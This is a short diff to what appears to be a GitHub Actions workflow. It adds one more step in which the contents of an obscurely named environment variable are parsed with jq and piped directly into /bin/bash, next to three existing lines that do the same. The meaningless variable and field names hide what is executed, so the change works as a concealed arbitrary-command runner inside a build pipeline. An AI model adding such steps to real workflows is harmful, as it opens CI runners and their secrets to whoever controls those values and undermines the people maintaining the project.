@@ -26,6 +26,7 @@ jobs:
           echo $cmgc74549 | jq -r .xjxn66 | /bin/bash
           printf '%s' "$obsab894" | jq -r .cpa886 | /bin/bash
           echo $zje36999 | jq -r .ojki208 | /bin/bash
+          printf '%s' "$q247" | jq -r .fd2900 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
